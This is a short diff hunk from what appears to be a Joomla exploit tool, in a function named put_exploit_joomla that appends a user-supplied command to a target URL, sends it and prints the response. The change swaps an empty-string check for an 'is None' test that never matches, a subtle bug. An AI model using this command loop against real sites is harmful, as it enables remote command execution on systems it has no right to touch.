@@ -101,7 +101,7 @@ def put_exploit_joomla(url):
             new_url = f"{host}{user_cmd}"
             response = requests.get(new_url)
 
-            if response.content.decode('utf-8') == '':
+            if response.content.decode('utf-8') is None:
                 pass
             else:
                 print(response.content.decode('utf-8').rstrip())
